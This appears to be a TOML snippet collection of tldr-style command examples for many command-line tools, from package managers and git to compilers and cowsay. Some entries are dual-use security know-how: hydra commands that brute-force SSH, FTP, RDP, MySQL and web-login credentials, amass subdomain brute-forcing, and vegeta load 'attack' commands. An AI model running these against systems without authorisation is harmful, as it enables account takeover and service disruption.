  description = "Download a package and add it to the list of [D]ev dependencies in `package.json`"
  command = "pnpm add -D <module_name>"
  output = ""

[[snippets]]
  description = "Download a package and install it [g]lobally"
  command = "pnpm add -g <module_name>"
  output = ""

[[snippets]]
  description = "Uninstall a package and remove it from the list of dependencies in `package.json`"
  command = "pnpm remove <module_name>"
  output = ""

[[snippets]]
  description = "Print a tree of locally installed modules"
  command = "pnpm list"
  output = ""

[[snippets]]
  description = "List top-level [g]lobally installed modules"
  command = "pnpm list -g --depth=<0>"
  output = ""

[[snippets]]
  description = "Set up an OpenAI API Key"
  command = "llm keys set openai"
  output = ""

[[snippets]]
  description = "Run a prompt"
  command = "llm ""<Ten fun names for a pet pelican>"""
  output = ""

[[snippets]]
  description = "Run a [s]ystem prompt against a file"
  command = "cat <path/to/file.py> | llm --system ""<Explain this code>"""
  output = ""

[[snippets]]
  description = "Install packages from PyPI into the same environment as LLM"
  command = "llm install <package1 package2 ...>"
  output = ""

[[snippets]]
  description = "Download and run a prompt against a [m]odel"
  command = "llm --model <orca-mini-3b-gguf2-q4_0> ""<What is the capital of France?>"""
  output = ""

[[snippets]]
  description = "Have an interactive chat with a specific [m]odel"
  command = "llm chat --model <chatgpt>"
  output = ""

[[snippets]]
  description = "Add a specified package to `go.mod` in module-mode or install the package in GOPATH-mode"
  command = "go get <example.com/pkg>"
  output = ""

[[snippets]]
  description = "Modify the package with a given version in module-aware mode"
  command = "go get <example.com/pkg>@<v1.2.3>"
  output = ""

[[snippets]]
  description = "Remove a specified package"
  command = "go get <example.com/pkg>@<none>"
  output = ""

[[snippets]]
  description = "List only local configuration entries (stored in `.git/config` in the current repository)"
  command = "git config --list --local"
  output = ""

[[snippets]]
  description = "List only global configuration entries (stored in `~/.gitconfig` by default or in `$XDG_CONFIG_HOME/git/config` if such a file exists)"
  command = "git config --list --global"
  output = ""

[[snippets]]
  description = "List only system configuration entries (stored in `/etc/gitconfig`), and show their file location"
  command = "git config --list --system --show-origin"
  output = ""

[[snippets]]
  description = "Get the value of a given configuration entry"
  command = "git config alias.unstage"
  output = ""

[[snippets]]
  description = "Set the global value of a given configuration entry"
  command = "git config --global alias.unstage ""reset HEAD --"""
  output = ""

[[snippets]]
  description = "Revert a global configuration entry to its default value"
  command = "git config --global --unset alias.unstage"
  output = ""

[[snippets]]
  description = "Edit the Git configuration for the current repository in the default editor"
  command = "git config --edit"
  output = ""

[[snippets]]
  description = "Edit the global Git configuration in the default editor"
  command = "git config --global --edit"
  output = ""

[[snippets]]
  description = "Open RainbowStream"
  command = "rainbowstream"
  output = ""

[[snippets]]
  description = "Show your timeline (optional number of tweets to display, default is 5)"
  command = "home [<num_of_last_tweets>]"
  output = ""

[[snippets]]
  description = "Show profile of a given user"
  command = "whois @<user>"
  output = ""

[[snippets]]
  description = "Tweet the message as-is"
  command = "t <message>"
  output = ""

[[snippets]]
  description = "Retweet the tweet with given ID (ID is beside the time)"
  command = "rt <tweet_id>"
  output = ""

[[snippets]]
  description = "Favorite the tweet with given ID"
  command = "fav <tweet_id>"
  output = ""

[[snippets]]
  description = "Perform a search for a given word (with or without hashtag)"
  command = "s <word>"
  output = ""

[[snippets]]
  description = "Launch Steam, printing debug messages to `stdout`"
  command = "steam"
  output = ""

[[snippets]]
  description = "Launch Steam and enable its in-app debug console tab"
  command = "steam -console"
  output = ""

[[snippets]]
  description = "Enable and open the Steam console tab in a running Steam instance"
  command = "steam steam://open/console"
  output = ""

[[snippets]]
  description = "Log into Steam with the specified credentials"
  command = "steam -login <username> <password>"
  output = ""

[[snippets]]
  description = "Launch Steam in Big Picture Mode"
  command = "steam -tenfoot"
  output = ""

[[snippets]]
  description = "Exit Steam"
  command = "steam -shutdown"
  output = ""

[[snippets]]
  description = "Start CliFM"
  command = "clifm"
  output = ""

[[snippets]]
  description = "Open the file or directory whose ELN (entry list number) is 12"
  command = "12"
  output = ""

[[snippets]]
  description = "Create a new file and a new directory"
  command = "n file dir/"
  output = ""

[[snippets]]
  description = "Search for PDF files in the current directory"
  command = "/*.pdf"
  output = ""

[[snippets]]
  description = "Select all PNG files in the current directory"
  command = "s *.png"
  output = ""

[[snippets]]
  description = "Remove the previously selected files (use `t` to send the files to the recycle bin instead)"
  command = "r sel"
  output = ""

[[snippets]]
  description = "Display help"
  command = "?"
  output = ""

[[snippets]]
  description = "Exit CliFM"
  command = "q"
  output = ""

[[snippets]]
  description = "Extract name and version field"
  command = "recsel -p name,version <data.rec>"
  output = ""

[[snippets]]
  description = "Use "~" to match a string with a given regular expression"
  command = "recsel -e ""<field_name> ~ '<regular_expression>' <data.rec>"""
  output = ""

[[snippets]]
  description = "Use a predicate to match a name and a version"
  command = "recsel -e ""name ~ '<regular_expression>' && version ~ '<regular_expression>'"" <data.rec>"
  output = ""

[[snippets]]
  description = "Run a command as the superuser"
  command = "sudo <less /var/log/syslog>"
  output = ""

[[snippets]]
  description = "Edit a file as the superuser with your default editor"
  command = "sudo --edit </etc/fstab>"
  output = ""

[[snippets]]
  description = "Run a command as another user and/or group"
  command = "sudo --user=<user> --group=<group> <id -a>"
  output = ""

[[snippets]]
  description = "Repeat the last command prefixed with `sudo` (only in `bash`, `zsh`, etc.)"
  command = "sudo !!"
  output = ""

[[snippets]]
  description = "Launch the default shell with superuser privileges and run login-specific files (`.profile`, `.bash_profile`, etc.)"
  command = "sudo --login"
  output = ""

[[snippets]]
  description = "Launch the default shell with superuser privileges without changing the environment"
  command = "sudo --shell"
  output = ""

[[snippets]]
  description = "Launch the default shell as the specified user, loading the user's environment and reading login-specific files (`.profile`, `.bash_profile`, etc.)"
  command = "sudo --login --user=<user>"
  output = ""

[[snippets]]
  description = "List the allowed (and forbidden) commands for the invoking user"
  command = "sudo --list"
  output = ""

[[snippets]]
  description = "Copy a local file to a remote host"
  command = "scp <path/to/local_file> <remote_host>:<path/to/remote_file>"
  output = ""

[[snippets]]
  description = "Use a specific port when connecting to the remote host"
  command = "scp -P <port> <path/to/local_file> <remote_host>:<path/to/remote_file>"
  output = ""

[[snippets]]
  description = "Copy a file from a remote host to a local directory"
  command = "scp <remote_host>:<path/to/remote_file> <path/to/local_directory>"
  output = ""

[[snippets]]
  description = "Recursively copy the contents of a directory from a remote host to a local directory"
  command = "scp -r <remote_host>:<path/to/remote_directory> <path/to/local_directory>"
  output = ""

[[snippets]]
  description = "Copy a file between two remote hosts transferring through the local host"
  command = "scp -3 <host1>:<path/to/remote_file> <host2>:<path/to/remote_directory>"
  output = ""

[[snippets]]
  description = "Use a specific username when connecting to the remote host"
  command = "scp <path/to/local_file> <remote_username>@<remote_host>:<path/to/remote_directory>"
  output = ""

[[snippets]]
  description = "Use a specific ssh private key for authentication with the remote host"
  command = "scp -i <~/.ssh/private_key> <path/to/local_file> <remote_host>:<path/to/remote_file>"
  output = ""

[[snippets]]
  description = "Use a specific proxy when connecting to the remote host"
  command = "scp -J <proxy_username>@<proxy_host> <path/to/local_file> <remote_host>:<path/to/remote_file>"
  output = ""

[[snippets]]
  description = "Create a keystore"
  command = "keytool -genkeypair -v -keystore <path/to/file.keystore> -alias <key_name>"
  output = ""

[[snippets]]
  description = "Change a keystore password"
  command = "keytool -storepasswd -keystore <path/to/file.keystore>"
  output = ""

[[snippets]]
  description = "Change a key's password inside a specific keystore"
  command = "keytool -keypasswd -alias <key_name> -keystore <path/to/file.keystore>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr musescore"
  output = ""

[[snippets]]
  description = "List running apps"
  command = "dokku apps"
  output = ""

[[snippets]]
  description = "Create an app"
  command = "dokku apps:create <app_name>"
  output = ""

[[snippets]]
  description = "Remove an app"
  command = "dokku apps:destroy <app_name>"
  output = ""

[[snippets]]
  description = "Install plugin"
  command = "dokku plugin:install <full_repo_url>"
  output = ""

[[snippets]]
  description = "Link database to an app"
  command = "dokku <db>:link <db_name> <app_name>"
  output = ""

[[snippets]]
  description = "Passively find subdomains of a [d]omain"
  command = "amass enum -passive -d <domain_name>"
  output = ""

[[snippets]]
  description = "Find subdomains of a [d]omain and actively verify them attempting to resolve the found subdomains"
  command = "amass enum -active -d <domain_name> -p <80,443,8080>"
  output = ""

[[snippets]]
  description = "Do a brute force search for subdomains"
  command = "amass enum -brute -d <domain_name>"
  output = ""

[[snippets]]
  description = "Save the results to a text file"
  command = "amass enum -o <output_file> -d <domain_name>"
  output = ""

[[snippets]]
  description = "Save the results to a database"
  command = "amass enum -o <output_file> -dir <path/to/database_directory>"
  output = ""

[[snippets]]
  description = "Archive a file or directory"
  command = "asar pack <path/to/input_file_or_directory> <path/to/output_archive.asar>"
  output = ""

[[snippets]]
  description = "Extract an archive"
  command = "asar extract <path/to/archive.asar>"
  output = ""

[[snippets]]
  description = "Extract a specific file from an archive"
  command = "asar extract-file <path/to/archive.asar> <file>"
  output = ""

[[snippets]]
  description = "List the contents of an archive file"
  command = "asar list <path/to/archive.asar>"
  output = ""

[[snippets]]
  description = "Read JSON from a file and execute a specified JSONPath expression"
  command = "ajson '<$..json[?(@.path)]>' <path/to/file.json>"
  output = ""

[[snippets]]
  description = "Read JSON from `stdin` and execute a specified JSONPath expression"
  command = "cat <path/to/file.json> | ajson '<$..json[?(@.path)]>'"
  output = ""

[[snippets]]
  description = "Read JSON from a URL and evaluate a specified JSONPath expression"
  command = "ajson '<avg($..price)>' '<https://example.com/api/>'"
  output = ""

[[snippets]]
  description = "Read some simple JSON and calculate a value"
  command = "echo '<3>' | ajson '<2 * pi * $>'"
  output = ""

[[snippets]]
  description = "Process macros in a file"
  command = "m4 <path/to/file>"
  output = ""

[[snippets]]
  description = "Define a macro before processing files"
  command = "m4 -D<macro_name>=<macro_value> <path/to/file>"
  output = ""

[[snippets]]
  description = "Initialize a simple Java class"
  command = "jbang init <path/to/file.java>"
  output = ""

[[snippets]]
  description = "Initialize a Java class (useful for scripting)"
  command = "jbang init --template=<cli> <path/to/file.java>"
  output = ""

[[snippets]]
  description = "Use `jshell` to explore and use a script and any dependencies in a REPL editor"
  command = "jbang run --interactive"
  output = ""

[[snippets]]
  description = "Setup a temporary project to edit a script in an IDE"
  command = "jbang edit --open=<codium|code|eclipse|idea|netbeans|gitpod> <path/to/script.java>"
  output = ""

[[snippets]]
  description = "Run a Java code snippet (Java 9 and later)"
  command = "<echo 'Files.list(Paths.get(""/etc"")).forEach(System.out::println);'> | jbang -"
  output = ""

[[snippets]]
  description = "Run command line application"
  command = "jbang <path/to/file.java> <command> <arg1 arg2 ...>"
  output = ""

[[snippets]]
  description = "Install a script on the user's `$PATH`"
  command = "jbang app install --name <command_name> <path/to/script.java>"
  output = ""

[[snippets]]
  description = "Install a specific version of JDK to be used with `jbang`"
  command = "jbang jdk install <version>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr fossil rm"
  output = ""

[[snippets]]
  description = "Install a formula/cask"
  command = "brew install <formula|cask>"
  output = ""

[[snippets]]
  description = "Build and install a formula from source (dependencies will still be installed from bottles)"
  command = "brew install --build-from-source <formula>"
  output = ""

[[snippets]]
  description = "Download the manifest, print what would be installed but don't actually install anything"
  command = "brew install --dry-run <formula|cask>"
  output = ""

[[snippets]]
  description = "Compress a file, creating a compressed version next to the file"
  command = "brotli <path/to/file>"
  output = ""

[[snippets]]
  description = "[d]ecompress a file, creating an uncompressed version next to the file"
  command = "brotli -d <path/to/file.br>"
  output = ""

[[snippets]]
  description = "Compress a file specifying the [o]utput filename"
  command = "brotli <path/to/file> -o <path/to/compressed_output_file.br>"
  output = ""

[[snippets]]
  description = "[d]ecompress a Brotli file specifying the [o]utput filename"
  command = "brotli -d <path/to/compressed_file.br> -o <path/to/output_file>"
  output = ""

[[snippets]]
  description = "Specify the compression quality (1=fastest (worst), 11=slowest (best))"
  command = "brotli -q <11> <path/to/file> -o <path/to/compressed_output_file.br>"
  output = ""

[[snippets]]
  description = "Create a service for a resource, which will be served from container port to node port"
  command = "kubectl expose <resource_type> <resource_name> --port=<node_port> --target-port=<container_port>"
  output = ""

[[snippets]]
  description = "Create a service for a resource identified by a file"
  command = "kubectl expose -f <path/to/file.yml> --port=<node_port> --target-port=<container_port>"
  output = ""

[[snippets]]
  description = "Create a service with a name, to serve to a node port which will be same for container port"
  command = "kubectl expose <resource_type> <resource_name> --port=<node_port> --name=<service_name>"
  output = ""

[[snippets]]
  description = "Write the MIT license to a file named `LICENSE`"
  command = "licensor <MIT> > <LICENSE>"
  output = ""

[[snippets]]
  description = "Write the MIT license with a [p]laceholder copyright notice to a file named `LICENSE`"
  command = "licensor -p <MIT> > <LICENSE>"
  output = ""

[[snippets]]
  description = "Specify a copyright holder named Bobby Tables"
  command = "licensor <MIT> <""Bobby Tables""> > <LICENSE>"
  output = ""

[[snippets]]
  description = "Specify licence exceptions with a WITH expression"
  command = "licensor ""<Apache-2.0 WITH LLVM-exception>"" > <LICENSE>"
  output = ""

[[snippets]]
  description = "List all available licenses"
  command = "licensor --licenses"
  output = ""

[[snippets]]
  description = "List all available exceptions"
  command = "licensor --exceptions"
  output = ""

[[snippets]]
  description = "Convert traceroute data in `warts` files to CSV and output it"
  command = "sc_warts2csv <path/to/file1.warts path/to/file2.warts ...>"
  output = ""

[[snippets]]
  description = "Pull a playbook from a VCS and execute a default local.yml playbook"
  command = "ansible-pull -U <repository_url>"
  output = ""

[[snippets]]
  description = "Pull a playbook from a VCS and execute a specific playbook"
  command = "ansible-pull -U <repository_url> <playbook>"
  output = ""

[[snippets]]
  description = "Pull a playbook from a VCS at a specific branch and execute a specific playbook"
  command = "ansible-pull -U <repository_url> -C <branch> <playbook>"
  output = ""

[[snippets]]
  description = "Pull a playbook from a VCS, specify hosts file and execute a specific playbook"
  command = "ansible-pull -U <repository_url> -i <hosts_file> <playbook>"
  output = ""

[[snippets]]
  description = "Rename an existing Git tag locally and remotely"
  command = "git rename-tag <old_tag_name> <new_tag_name>"
  output = ""

[[snippets]]
  description = "Display help and list subcommands"
  command = "pio --help"
  output = ""

[[snippets]]
  description = "Display help for a specific subcommand"
  command = "pio <subcommand> --help"
  output = ""

[[snippets]]
  description = "Display version"
  command = "pio --version"
  output = ""

[[snippets]]
  description = "Bootstrap a new node"
  command = "knife bootstrap <fqdn_or_ip>"
  output = ""

[[snippets]]
  description = "List all registered nodes"
  command = "knife node list"
  output = ""

[[snippets]]
  description = "Show a node"
  command = "knife node show <node_name>"
  output = ""

[[snippets]]
  description = "Edit a node"
  command = "knife node edit <node_name>"
  output = ""

[[snippets]]
  description = "Edit a role"
  command = "knife role edit <role_name>"
  output = ""

[[snippets]]
  description = "View a data bag"
  command = "knife data bag show <data_bag_name> <data_bag_item>"
  output = ""

[[snippets]]
  description = "Upload a local cookbook to the Chef server"
  command = "knife cookbook upload <cookbook_name>"
  output = ""

[[snippets]]
  description = "Apply a commit to the current branch"
  command = "git cherry-pick <commit>"
  output = ""

[[snippets]]
  description = "Apply a range of commits to the current branch (see also `git rebase --onto`)"
  command = "git cherry-pick <start_commit>~..<end_commit>"
  output = ""

[[snippets]]
  description = "Apply multiple (non-sequential) commits to the current branch"
  command = "git cherry-pick <commit1 commit2 ...>"
  output = ""

[[snippets]]
  description = "Add the changes of a commit to the working directory, without creating a commit"
  command = "git cherry-pick --no-commit <commit>"
  output = ""

[[snippets]]
  description = "Call `echo` with the "foo" argument"
  command = "eval ""<echo foo>"""
  output = ""

[[snippets]]
  description = "Set a variable in the current shell"
  command = "eval ""<foo=bar>"""
  output = ""

[[snippets]]
  description = "Initialize an .rspec configuration and a spec helper file"
  command = "rspec --init"
  output = ""

[[snippets]]
  description = "Run all tests"
  command = "rspec"
  output = ""

[[snippets]]
  description = "Run a specific directory of tests"
  command = "rspec <path/to/directory>"
  output = ""

[[snippets]]
  description = "Run one or more test files"
  command = "rspec <path/to/file1 path/to/file2 ...>"
  output = ""

[[snippets]]
  description = "Run a specific test in a file (e.g. the test starts on line 83)"
  command = "rspec <path/to/file>:<83>"
  output = ""

[[snippets]]
  description = "Run specs with a specific seed"
  command = "rspec --seed <seed_number>"
  output = ""

[[snippets]]
  description = "Start the current application in development mode"
  command = "next dev"
  output = ""

[[snippets]]
  description = "Start the current application and listen on a specific port"
  command = "next dev --port <port>"
  output = ""

[[snippets]]
  description = "Build the current application optimized for production"
  command = "next build"
  output = ""

[[snippets]]
  description = "Start the compiled application in production mode"
  command = "next start"
  output = ""

[[snippets]]
  description = "Start the compiled application and listen on a specific port"
  command = "next start --port <port>"
  output = ""

[[snippets]]
  description = "Export the current application to static HTML pages"
  command = "next export"
  output = ""

[[snippets]]
  description = "Display the Next.js telemetry status"
  command = "next telemetry"
  output = ""

[[snippets]]
  description = "Display help for a subcommand"
  command = "next <build|dev|export|start|telemetry> --help"
  output = ""

[[snippets]]
  description = "Encrypt a file for `user` and save it to `message.age`"
  command = "echo ""<Your secret message>"" | rage --encrypt --recipient <user> --output <path/to/message.age>"
  output = ""

[[snippets]]
  description = "Decrypt a file with `identity_file` and save it to `message`"
  command = "rage --decrypt --identity <path/to/identity_file> --output <message>"
  output = ""

[[snippets]]
  description = "Compile source file(s) and create an executable"
  command = "c99 <file.c>"
  output = ""

[[snippets]]
  description = "Compile source file(s) and specify the executable [o]utput filename"
  command = "c99 -o <executable_name> <file.c>"
  output = ""

[[snippets]]
  description = "Compile source file(s) and create object file(s)"
  command = "c99 -c <file.c>"
  output = ""

[[snippets]]
  description = "Compile source file(s), link with object file(s), and create an executable"
  command = "c99 <file.c> <file.o>"
  output = ""

[[snippets]]
  description = "Compile the project in the current directory"
  command = "zig build"
  output = ""

[[snippets]]
  description = "Compile and run the project in the current directory"
  command = "zig build run"
  output = ""

[[snippets]]
  description = "Initialize a `zig build` application"
  command = "zig init-exe"
  output = ""

[[snippets]]
  description = "Initialize a `zig build` library"
  command = "zig init-lib"
  output = ""

[[snippets]]
  description = "Create and run a test build"
  command = "zig test <path/to/file.zig>"
  output = ""

[[snippets]]
  description = "Reformat Zig source into canonical form"
  command = "zig fmt <path/to/file.zig>"
  output = ""

[[snippets]]
  description = "Use Zig as a drop-in C compiler"
  command = "zig cc <path/to/file.c>"
  output = ""

[[snippets]]
  description = "Use Zig as a drop-in C++ compiler"
  command = "zig c++ <path/to/file.cpp>"
  output = ""

[[snippets]]
  description = "Launch an attack lasting 30 seconds"
  command = "echo ""<GET https://example.com>"" | vegeta attack -duration=<30s>"
  output = ""

[[snippets]]
  description = "Launch an attack on a server with a self-signed HTTPS certificate"
  command = "echo ""<GET https://example.com>"" | vegeta attack -insecure -duration=<30s>"
  output = ""

[[snippets]]
  description = "Launch an attack with a rate of 10 requests per second"
  command = "echo ""<GET https://example.com>"" | vegeta attack -duration=<30s> -rate=<10>"
  output = ""

[[snippets]]
  description = "Launch an attack and display a report"
  command = "echo ""<GET https://example.com>"" | vegeta attack -duration=<30s> | vegeta report"
  output = ""

[[snippets]]
  description = "Launch an attack and plot the results on a graph (latency over time)"
  command = "echo ""<GET https://example.com>"" | vegeta attack -duration=<30s> | vegeta plot > <path/to/results.html>"
  output = ""

[[snippets]]
  description = "Launch an attack against multiple URLs from a file"
  command = "vegeta attack -duration=<30s> -targets=<requests.txt> | vegeta report"
  output = ""

[[snippets]]
  description = "Give the PPM image an American TV appearance"
  command = "ppmtv <dim_factor> <path/to/file.ppm> > <path/to/output.ppm>"
  output = ""

[[snippets]]
  description = "Suppress all informational messages"
  command = "ppmtv -quiet"
  output = ""

[[snippets]]
  description = "Display version"
  command = "ppmtv -version"
  output = ""

[[snippets]]
  description = "Execute a Fossil subcommand"
  command = "fossil <subcommand>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "fossil help"
  output = ""

[[snippets]]
  description = "Display help for a specific subcommand (like `add`, `commit`, etc.)"
  command = "fossil help <subcommand>"
  output = ""

[[snippets]]
  description = "Display version"
  command = "fossil version"
  output = ""

[[snippets]]
  description = "Dump all databases"
  command = "pg_dumpall > <path/to/file.sql>"
  output = ""

[[snippets]]
  description = "Dump all databases using a specific username"
  command = "pg_dumpall --username=<username> > <path/to/file.sql>"
  output = ""

[[snippets]]
  description = "Same as above, customize host and port"
  command = "pg_dumpall -h <host> -p <port> > <output_file.sql>"
  output = ""

[[snippets]]
  description = "Dump all databases into a custom-format archive file with moderate compression"
  command = "pg_dumpall -Fc > <output_file.dump>"
  output = ""

[[snippets]]
  description = "Dump only database data into an SQL-script file"
  command = "pg_dumpall --data-only > <path/to/file.sql>"
  output = ""

[[snippets]]
  description = "Dump only schema (data definitions) into an SQL-script file"
  command = "pg_dumpall -s > <output_file.sql>"
  output = ""

[[snippets]]
  description = "Fetch the latest changes from the default remote upstream repository (origin)"
  command = "dolt fetch"
  output = ""

[[snippets]]
  description = "Fetch latest changes from a specific remote upstream repository"
  command = "dolt fetch <remote_name>"
  output = ""

[[snippets]]
  description = "Update branches with the current state of the remote, overwriting any conflicting history"
  command = "dolt fetch -f"
  output = ""

[[snippets]]
  description = "Run a command once for each line of input data as arguments"
  command = "<arguments_source> | xe <command>"
  output = ""

[[snippets]]
  description = "Execute the commands, replacing any occurrence of the placeholder (marked as `{}`) with the input line"
  command = "<arguments_source> | xe <command> {} <optional_extra_arguments>"
  output = ""

[[snippets]]
  description = "Execute a shellscript, joining every `N` lines into a single call"
  command = "echo -e 'a\nb' | xe -N<2> -s 'echo $2 $1'"
  output = ""

[[snippets]]
  description = "Delete all files with a `.backup` extension"
  command = "find . -name <'*.backup'> | xe rm -v"
  output = ""

[[snippets]]
  description = "Run up to `max-jobs` processes in parallel; the default is 1. If `max-jobs` is 0, xe will run as many processes as cpu cores"
  command = "<arguments_source> | xe -j <max-jobs> <command>"
  output = ""

[[snippets]]
  description = "Print an ASCII cow saying "hello, world""
  command = "cowsay ""<hello, world>"""
  output = ""

[[snippets]]
  description = "Print an ASCII cow saying text from `stdin`"
  command = "echo ""<hello, world>"" | cowsay"
  output = ""

[[snippets]]
  description = "List all available art types"
  command = "cowsay -l"
  output = ""

[[snippets]]
  description = "Print the specified ASCII art saying "hello, world""
  command = "cowsay -f <art> ""<hello, world>"""
  output = ""

[[snippets]]
  description = "Print a dead thinking ASCII cow"
  command = "cowthink -d ""<I'm just a cow, not a great thinker...>"""
  output = ""

[[snippets]]
  description = "Print an ASCII cow with custom eyes saying "hello, world""
  command = "cowsay -e <characters> ""<hello, world>"""
  output = ""

[[snippets]]
  description = "Start an interactive shell session"
  command = "bash"
  output = ""

[[snippets]]
  description = "Start an interactive shell session without loading startup configs"
  command = "bash --norc"
  output = ""

[[snippets]]
  description = "Execute specific [c]ommands"
  command = "bash -c ""<echo 'bash is executed'>"""
  output = ""

[[snippets]]
  description = "Execute a specific script"
  command = "bash <path/to/script.sh>"
  output = ""

[[snippets]]
  description = "E[x]ecute a specific script, printing each command before executing it"
  command = "bash -x <path/to/script.sh>"
  output = ""

[[snippets]]
  description = "Execute a specific script and stop at the first [e]rror"
  command = "bash -e <path/to/script.sh>"
  output = ""

[[snippets]]
  description = "Execute specific commands from `stdin`"
  command = "<echo ""echo 'bash is executed'""> | bash"
  output = ""

[[snippets]]
  description = "Start a [r]estricted shell session"
  command = "bash -r"
  output = ""

[[snippets]]
  description = "Initialize it inside an existing Git repository"
  command = "git flow init"
  output = ""

[[snippets]]
  description = "Start developing on a feature branch based on `develop`"
  command = "git flow feature start <feature>"
  output = ""

[[snippets]]
  description = "Finish development on a feature branch, merging it into the `develop` branch and deleting it"
  command = "git flow feature finish <feature>"
  output = ""

[[snippets]]
  description = "Publish a feature to the remote server"
  command = "git flow feature publish <feature>"
  output = ""

[[snippets]]
  description = "Get a feature published by another user"
  command = "git flow feature pull origin <feature>"
  output = ""

[[snippets]]
  description = "Generate random password with s[y]mbols"
  command = "pwgen -y <length>"
  output = ""

[[snippets]]
  description = "Generate secure, hard-to-memorize passwords"
  command = "pwgen -s <length>"
  output = ""

[[snippets]]
  description = "Generate password with at least one capital letter in them"
  command = "pwgen -c <length>"
  output = ""

[[snippets]]
  description = "Generate a QR code"
  command = "echo ""<data>"" | qr"
  output = ""

[[snippets]]
  description = "Specify the error correction level (defaults to M)"
  command = "echo ""<data>"" | qr --error-correction=<L|M|Q|H>"
  output = ""

[[snippets]]
  description = "Optimize an SVG"
  command = "svgcleaner <input.svg> <output.svg>"
  output = ""

[[snippets]]
  description = "Optimize an SVG multiple times"
  command = "svgcleaner --multipass <input.svg> <output.svg>"
  output = ""

[[snippets]]
  description = "Print a formatted version of a shell script"
  command = "shfmt <path/to/file>"
  output = ""

[[snippets]]
  description = "List unformatted files"
  command = "shfmt --list <path/to/directory>"
  output = ""

[[snippets]]
  description = "Write the result to the file instead of printing it to the terminal"
  command = "shfmt --write <path/to/file>"
  output = ""

[[snippets]]
  description = "Simplify the code, removing redundant pieces of syntax (i.e. removing "$" from vars in expressions)"
  command = "shfmt --simplify <path/to/file>"
  output = ""

[[snippets]]
  description = "Return a list of installed fonts in your system"
  command = "fc-list"
  output = ""

[[snippets]]
  description = "Return a list of installed fonts with given name"
  command = "fc-list | grep '<DejaVu Serif>'"
  output = ""

[[snippets]]
  description = "Return the number of installed fonts in your system"
  command = "fc-list | wc -l"
  output = ""

[[snippets]]
  description = "Start Hydra's wizard"
  command = "hydra-wizard"
  output = ""

[[snippets]]
  description = "Guess SSH credentials using a given username and a list of passwords"
  command = "hydra -l <username> -P <path/to/wordlist.txt> <host_ip> <ssh>"
  output = ""

[[snippets]]
  description = "Guess HTTPS webform credentials using two specific lists of usernames and passwords ("https_post_request" can be like "username=^USER^&password=^PASS^")"
  command = "hydra -L <path/to/usernames.txt> -P <path/to/wordlist.txt> <host_ip> <https-post-form> ""<url_without_host>:<https_post_request>:<login_failed_string>"""
  output = ""

[[snippets]]
  description = "Guess FTP credentials using usernames and passwords lists, specifying the number of threads"
  command = "hydra -L <path/to/usernames.txt> -P <path/to/wordlist.txt> -t <n_tasks> <host_ip> <ftp>"
  output = ""

[[snippets]]
  description = "Guess MySQL credentials using a username and a passwords list, exiting when a username/password pair is found"
  command = "hydra -l <username> -P <path/to/wordlist.txt> -f <host_ip> <mysql>"
  output = ""

[[snippets]]
  description = "Guess RDP credentials using a username and a passwords list, showing each attempt"
  command = "hydra -l <username> -P <path/to/wordlist.txt> -V <rdp://host_ip>"
  output = ""

[[snippets]]
  description = "Guess IMAP credentials on a range of hosts using a list of colon-separated username/password pairs"
  command = "hydra -C <path/to/username_password_pairs.txt> <imap://[host_range_cidr]>"
  output = ""

[[snippets]]
  description = "Guess POP3 credentials on a list of hosts using usernames and passwords lists, exiting when a username/password pair is found"
  command = "hydra -L <path/to/usernames.txt> -P <path/to/wordlist.txt> -M <path/to/hosts.txt> -F <pop3>"
  output = ""

[[snippets]]
  description = "Synchronize labels using a local `labels.json` file"
  command = "github-label-sync --access-token <token> <repository_name>"
  output = ""

[[snippets]]
  description = "Synchronize labels using a specific labels JSON file"
  command = "github-label-sync --access-token <token> --labels <url|path/to/json_file> <repository_name>"
  output = ""

[[snippets]]
  description = "Perform a dry run instead of actually synchronizing labels"
  command = "github-label-sync --access-token <token> --dry-run <repository_name>"
  output = ""

[[snippets]]
  description = "Keep labels that aren't in `labels.json`"
  command = "github-label-sync --access-token <token> --allow-added-labels <repository_name>"
  output = ""

[[snippets]]
  description = "Synchronize using the `GITHUB_ACCESS_TOKEN` environment variable"
  command = "github-label-sync <repository_name>"
  output = ""

[[snippets]]
  description = "Import bookmarks from HTML Netscape bookmark format file"
  command = "shiori import <path/to/bookmarks.html>"
  output = ""

[[snippets]]
  description = "Save the specified URL as bookmark"
  command = "shiori add <url>"
  output = ""

[[snippets]]
  description = "List the saved bookmarks"
  command = "shiori print"
  output = ""

[[snippets]]
  description = "Open the saved bookmark in a browser"
  command = "shiori open <bookmark_id>"
  output = ""

[[snippets]]
  description = "Start the web interface for managing bookmarks at port 8181"
  command = "shiori serve --port <8181>"
  output = ""

[[snippets]]
  description = "Display the JSON object with full path to the `Cargo.toml` manifest"
  command = "cargo locate-project"
  output = ""

[[snippets]]
  description = "Display the project path in the specified format"
  command = "cargo locate-project --message-format <plain|json>"
  output = ""

[[snippets]]
  description = "Display the `Cargo.toml` manifest located at the root of the workspace as opposed to the current workspace member"
  command = "cargo locate-project --workspace"
  output = ""

[[snippets]]
  description = "Display the `Cargo.toml` manifest of a specific directory"
  command = "cargo locate-project --manifest-path <path/to/Cargo.toml>"
  output = ""

[[snippets]]
  description = "Start top-like I/O monitor"
  command = "sudo iotop"
  output = ""

[[snippets]]
  description = "Show only processes or threads actually doing I/O"
  command = "sudo iotop --only"
  output = ""

[[snippets]]
  description = "Show I/O usage in non-interactive mode"
  command = "sudo iotop --batch"
  output = ""

[[snippets]]
  description = "Show only I/O usage of processes (default is to show all threads)"
  command = "sudo iotop --processes"
  output = ""

[[snippets]]
  description = "Show I/O usage of given PID(s)"
  command = "sudo iotop --pid=<PID>"
  output = ""

[[snippets]]
  description = "Show I/O usage of a given user"
  command = "sudo iotop --user=<user>"
  output = ""

[[snippets]]
  description = "Show accumulated I/O instead of bandwidth"
  command = "sudo iotop --accumulated"
  output = ""

[[snippets]]
  description = "Create a tape file (add commands to the tape file using an editor)"
  command = "vhs new <path/to/file.tape>"
  output = ""

[[snippets]]
  description = "Record inputs to a tape file (once done, exit the shell to create the tape)"
  command = "vhs record > <path/to/file.tape>"
  output = ""

[[snippets]]
  description = "Record inputs to a tape file using a specific shell"
  command = "vhs record --shell <shell> > <path/to/file.tape>"
  output = ""

[[snippets]]
  description = "Validate the syntax of a tape file"
  command = "vhs validate <path/to/file.tape>"
  output = ""

[[snippets]]
  description = "Create a gif from a tape file"
  command = "vhs < <path/to/file.tape>"
  output = ""

[[snippets]]
  description = "Publish a gif to <https://vhs.charm.sh> and get a shareable URL"
  command = "vhs publish <path/to/file.gif>"
